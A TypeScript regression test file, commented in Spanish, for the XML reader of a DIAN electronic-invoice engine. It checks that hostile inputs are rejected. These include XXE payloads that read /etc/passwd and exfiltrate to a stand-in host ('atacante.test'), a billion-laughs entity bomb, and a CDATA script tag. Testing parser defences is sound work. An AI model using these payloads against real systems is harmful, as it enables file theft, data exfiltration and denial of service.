// Pruebas de seguridad del lector XML del motor DIAN.
//
// El XML lo aporta un tercero desconocido: llega por correo, por el portal
// de la DIAN o dentro de un ZIP que sube el contador. Estas son las
// defensas que no pueden regresar nunca.
//
//   npm run check:dian-security

import { parseXml, XmlError } from '../src/lib/dian/xml';
import { parseDianXml } from '../src/lib/dian/parser';

interface Caso {
  nombre: string;
  xml: string;
  espera: string;
}

const casos: Caso[] = [
  {
    nombre: 'XXE — lectura de archivo local vía entidad externa',
    xml: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
    espera: 'DOCTYPE_PROHIBIDO',
  },
  {
    nombre: 'XXE — exfiltración por HTTP',
    xml: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://atacante.test/roba">]><r>&x;</r>',
    espera: 'DOCTYPE_PROHIBIDO',
  },
  {
    nombre: 'Bomba de entidades (billion laughs)',
    xml: '<?xml version="1.0"?><!DOCTYPE l [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">]><l>&c;</l>',
    espera: 'DOCTYPE_PROHIBIDO',
  },
  {
    nombre: 'Declaración suelta de ENTITY',
    xml: '<!ENTITY x "y"><r>ok</r>',
    espera: 'DOCTYPE_PROHIBIDO',
  },
  {
    nombre: 'Anidamiento excesivo',
    xml: '<r>' + '<a>'.repeat(300) + '</a>'.repeat(300) + '</r>',
    espera: 'DEMASIADO_PROFUNDO',
  },
  {
    nombre: 'Documento por encima del límite de tamaño',
    xml: '<r>' + 'x'.repeat(13 * 1024 * 1024) + '</r>',
    espera: 'DEMASIADO_GRANDE',
  },
  {
    nombre: 'Etiquetas mal cerradas',
    xml: '<a><b></a></b>',
    espera: 'MAL_FORMADO',
  },
  {
    nombre: 'Sin elemento raíz',
    xml: '   \n  ',
    espera: 'MAL_FORMADO',
  },
];

let fallos = 0;

console.log('\n  Defensas del lector XML\n');

for (const c of casos) {
  try {
    parseXml(c.xml);
    console.log(`  ✕ ${c.nombre}\n      NO fue rechazado — se esperaba ${c.espera}`);
    fallos++;
  } catch (e) {
    const err = e as XmlError;
    if (err.code === c.espera) {
      console.log(`  ✓ ${c.nombre}  →  ${err.code}`);
    } else {
      console.log(`  ✕ ${c.nombre}\n      se esperaba ${c.espera} y llegó ${err.code ?? err.message}`);
      fallos++;
    }
  }
}

console.log('\n  Comportamiento correcto sobre documentos legítimos\n');

// El namespace se resuelve aunque el prefijo cambie: los emisores declaran
// los mismos namespaces con prefijos distintos, y buscar 'cbc:ID' en vez de
// 'ID' fallaría en la mitad de los documentos reales.
const conPrefijo = parseXml('<Invoice xmlns:cbc="urn:x"><cbc:ID>FE1</cbc:ID></Invoice>');
const sinPrefijo = parseXml('<Invoice xmlns="urn:x"><ID>FE1</ID></Invoice>');
const distinto = parseXml('<Invoice xmlns:zz="urn:x"><zz:ID>FE1</zz:ID></Invoice>');

for (const [etiqueta, doc] of [['prefijo cbc:', conPrefijo], ['sin prefijo', sinPrefijo], ['prefijo zz:', distinto]] as const) {
  const hijo = doc.children[0];
  const bien = hijo.name === 'ID' && hijo.text === 'FE1' && hijo.ns === 'urn:x';
  console.log(`  ${bien ? '✓' : '✕'} ${etiqueta.padEnd(14)} → name=${hijo.name} ns=${hijo.ns} text=${hijo.text}`);
  if (!bien) fallos++;
}

// El CDATA es literal: un "<script>" dentro no debe convertirse en nodos.
const cdata = parseXml('<r><![CDATA[<script>alert(1)</script>]]></r>');
const literal = cdata.children.length === 0 && cdata.text.includes('<script>');
console.log(`  ${literal ? '✓' : '✕'} CDATA literal   → ${cdata.children.length} hijos, texto conservado`);
if (!literal) fallos++;

// Las entidades básicas sí se resuelven; ninguna otra.
const ent = parseXml('<r>a &lt; b &amp; c &#65; &desconocida;</r>');
const okEnt = ent.text === 'a < b & c A &desconocida;';
console.log(`  ${okEnt ? '✓' : '✕'} entidades       → ${JSON.stringify(ent.text)}`);
if (!okEnt) fallos++;

// Un XML inválido debe devolver una excepción tipada, nunca lanzar: un
// archivo corrupto no puede tumbar el procesamiento de un lote entero.
const roto = parseDianXml('<Invoice><sin cerrar');
const manejado = roto.ok === false && roto.documento === null && roto.excepciones.length > 0;
console.log(`  ${manejado ? '✓' : '✕'} XML roto        → ok=${roto.ok}, ${roto.excepciones[0]?.codigo}`);
if (!manejado) fallos++;

console.log(`\n  ${fallos === 0 ? 'Todo correcto.' : `${fallos} fallo(s).`}\n`);
process.exit(fallos === 0 ? 0 : 1);
